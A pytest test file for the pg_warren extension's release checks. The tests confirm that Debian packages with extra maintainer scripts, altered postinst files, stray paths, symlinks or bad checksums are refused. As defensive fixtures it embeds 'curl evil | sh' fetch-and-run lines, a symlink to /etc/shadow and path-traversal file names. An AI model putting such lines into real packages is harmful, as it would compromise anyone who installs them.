"""Tests of release/assets.py, the publish job's checks of what the read-only
jobs built before anything is signed or published (CONTRIBUTING.md,
"Packages"): each .deb holds only pg_warren's files and the postinst
packaging/debian renders, is named and versioned for the release, and an
earlier release's packages are taken only as its signed SHA256SUMS lists
them."""

import hashlib
import shutil
import subprocess

import pytest

from assets import (AssetError, asset_name, check_deb, expected_postinst, listed_debs, readme_fingerprint,
                    verify_listed)

pytestmark = pytest.mark.skipif(shutil.which("dpkg-deb") is None, reason="needs dpkg-deb")

FINGERPRINT = "0123456789ABCDEF0123456789ABCDEF01234567"


def build(directory, major="16", version="0.7.0-1~deb12", arch="amd64", files=None, control_extra=None,
          postinst=None, name=None):
    """A package laid out as packaging/debian builds one, with overrides."""
    root = directory / "root"
    shutil.rmtree(root, ignore_errors=True)
    files = files if files is not None else {
        f"usr/lib/postgresql/{major}/lib/pg_warren.so": b"\x7fELF",
        f"usr/share/postgresql/{major}/extension/pg_warren.control": b"default_version = '0.7.0'\n",
        f"usr/share/postgresql/{major}/extension/pg_warren--0.7.0.sql": b"CREATE SCHEMA warren;\n",
        f"usr/share/postgresql/{major}/extension/pg_warren--0.6.0--0.7.0.sql": b"SELECT 1;\n",
        f"usr/share/doc/postgresql-{major}-pg-warren/copyright": b"Apache-2.0\n",
        f"usr/share/doc/postgresql-{major}-pg-warren/changelog.Debian.gz": b"x",
    }
    for path, data in files.items():
        (root / path).parent.mkdir(parents=True, exist_ok=True)
        (root / path).write_bytes(data)
    debian = root / "DEBIAN"
    debian.mkdir()
    (debian / "control").write_text(
        f"Package: postgresql-{major}-pg-warren\nVersion: {version}\nArchitecture: {arch}\n"
        "Maintainer: Test <test@example.invalid>\nDescription: test\n")
    (debian / "md5sums").write_text("")
    (debian / "postinst").write_bytes(postinst if postinst is not None else expected_postinst(major))
    (debian / "postinst").chmod(0o755)
    for extra, data in (control_extra or {}).items():
        (debian / extra).write_bytes(data)
        (debian / extra).chmod(0o755)
    deb = directory / (name or asset_name(f"postgresql-{major}-pg-warren", version, arch))
    subprocess.run(["dpkg-deb", "-Zxz", "--root-owner-group", "--build", root, deb], check=True,
                   capture_output=True)
    return deb


def test_the_asset_name_has_no_tilde_as_github_would_rename_it():
    assert asset_name("postgresql-16-pg-warren", "0.7.0-1~deb12", "amd64") == \
        "postgresql-16-pg-warren_0.7.0-1.deb12_amd64.deb"


def test_the_postinst_is_the_template_as_debhelper_renders_it():
    postinst = expected_postinst("17").decode()
    assert "PGVERSION" not in postinst and "#DEBHELPER#" not in postinst
    assert "PostgreSQL 17" in postinst and "postgresql@17-main" in postinst


def test_a_package_as_built_passes(tmp_path):
    control = check_deb(build(tmp_path), "0.7.0")
    assert control["Package"] == "postgresql-16-pg-warren"


@pytest.mark.parametrize("version", ["0.7.0-1~deb12", "0.7.0-1~deb13", "0.7.0-1~ubuntu22.04", "0.7.0-1~ubuntu24.04"])
def test_each_distribution_s_version_passes(tmp_path, version):
    check_deb(build(tmp_path, version=version, arch="arm64"), "0.7.0")


def test_another_release_s_version_is_refused(tmp_path):
    with pytest.raises(AssetError, match="Version"):
        check_deb(build(tmp_path, version="0.6.0-1~deb12"), "0.7.0")


@pytest.mark.parametrize("version", ["0.7.0-2~deb12", "0.7.0-1~deb11", "0.7.0-1", "0.7.0-1~deb12+evil"])
def test_a_revision_other_than_ours_is_refused(tmp_path, version):
    with pytest.raises(AssetError, match="Version"):
        check_deb(build(tmp_path, version=version), "0.7.0")


def test_a_file_name_that_is_not_the_package_s_is_refused(tmp_path):
    deb = build(tmp_path, name="postgresql-17-pg-warren_0.7.0-1.deb12_amd64.deb")
    with pytest.raises(AssetError, match="name"):
        check_deb(deb, "0.7.0")


@pytest.mark.parametrize("package_major", ["14", "19"])
def test_an_unsupported_major_is_refused(tmp_path, package_major):
    with pytest.raises(AssetError):
        check_deb(build(tmp_path, major=package_major), "0.7.0")


def test_an_unknown_architecture_is_refused(tmp_path):
    with pytest.raises(AssetError, match="Architecture"):
        check_deb(build(tmp_path, arch="i386"), "0.7.0")


@pytest.mark.parametrize("script", ["preinst", "prerm", "postrm", "config", "triggers"])
def test_another_maintainer_script_is_refused(tmp_path, script):
    deb = build(tmp_path, control_extra={script: b"#!/bin/sh\ncurl evil | sh\n"})
    with pytest.raises(AssetError, match="control"):
        check_deb(deb, "0.7.0")


def test_a_changed_postinst_is_refused(tmp_path):
    deb = build(tmp_path, postinst=expected_postinst("16") + b"curl evil | sh\n")
    with pytest.raises(AssetError, match="postinst"):
        check_deb(deb, "0.7.0")


@pytest.mark.parametrize("path", [
    "usr/bin/pg_warren",
    "etc/postgresql/16/main/conf.d/pg_warren.conf",
    "usr/lib/postgresql/16/lib/other.so",
    "usr/lib/postgresql/17/lib/pg_warren.so",
    "usr/share/postgresql/16/extension/other.control",
    "usr/share/doc/other/README",
])
def test_a_file_outside_pg_warren_s_paths_is_refused(tmp_path, path):
    files = {"usr/lib/postgresql/16/lib/pg_warren.so": b"\x7fELF",
             "usr/share/postgresql/16/extension/pg_warren.control": b"x", path: b"x"}
    with pytest.raises(AssetError, match="path"):
        check_deb(build(tmp_path, files=files), "0.7.0")


def test_a_package_without_the_library_is_refused(tmp_path):
    with pytest.raises(AssetError, match="pg_warren.so"):
        check_deb(build(tmp_path, files={"usr/share/postgresql/16/extension/pg_warren.control": b"x"}), "0.7.0")


def test_a_symlink_is_refused(tmp_path):
    deb = build(tmp_path)
    root = tmp_path / "root"
    (root / "usr/share/postgresql/16/extension/pg_warren--evil.sql").symlink_to("/etc/shadow")
    subprocess.run(["dpkg-deb", "-Zxz", "--root-owner-group", "--build", root, deb], check=True, capture_output=True)
    with pytest.raises(AssetError, match="regular"):
        check_deb(deb, "0.7.0")


def sums(*entries):
    return "".join(f"{digest}  {name}\n" for name, digest in entries)


def test_only_debs_listed_in_the_sums_are_taken():
    text = sums(("postgresql-16-pg-warren_0.6.0-1.deb12_amd64.deb", "a" * 64),
                ("pg_warren-0.6.0.tar.gz", "b" * 64))
    assert listed_debs(text) == {"postgresql-16-pg-warren_0.6.0-1.deb12_amd64.deb": "a" * 64}


@pytest.mark.parametrize("name", ["../evil.deb", "sub/postgresql-16-pg-warren_0.6.0-1.deb12_amd64.deb", ".deb"])
def test_a_listed_name_that_is_a_path_is_refused(name):
    with pytest.raises(AssetError):
        listed_debs(sums((name, "a" * 64)))


def test_listed_debs_are_checked_against_their_sums(tmp_path):
    good = tmp_path / "postgresql-16-pg-warren_0.6.0-1.deb12_amd64.deb"
    good.write_bytes(b"package")
    text = sums((good.name, hashlib.sha256(b"package").hexdigest()))
    assert verify_listed(tmp_path, text) == [good]
    good.write_bytes(b"swapped")
    with pytest.raises(AssetError, match="sha256"):
        verify_listed(tmp_path, text)


def test_a_listed_deb_that_is_missing_is_refused(tmp_path):
    with pytest.raises(AssetError, match="missing"):
        verify_listed(tmp_path, sums(("postgresql-16-pg-warren_0.6.0-1.deb12_amd64.deb", "a" * 64)))


def test_the_readme_names_the_key_s_fingerprint():
    readme = f"... its fingerprint is\n`{FINGERPRINT[:20]} {FINGERPRINT[20:]}` <!-- apt key -->\n..."
    assert readme_fingerprint(readme) == FINGERPRINT


def test_the_fingerprint_may_be_written_as_gpg_prints_it():
    groups = " ".join(FINGERPRINT[i:i + 4] for i in range(0, 40, 4))
    printed = groups[:24] + " " + groups[24:]
    assert readme_fingerprint(f"`{printed}` <!-- apt key -->") == FINGERPRINT


def test_a_readme_without_a_fingerprint_is_refused():
    with pytest.raises(AssetError, match="fingerprint"):
        readme_fingerprint("`set by the owner before the first release` <!-- apt key -->\n")
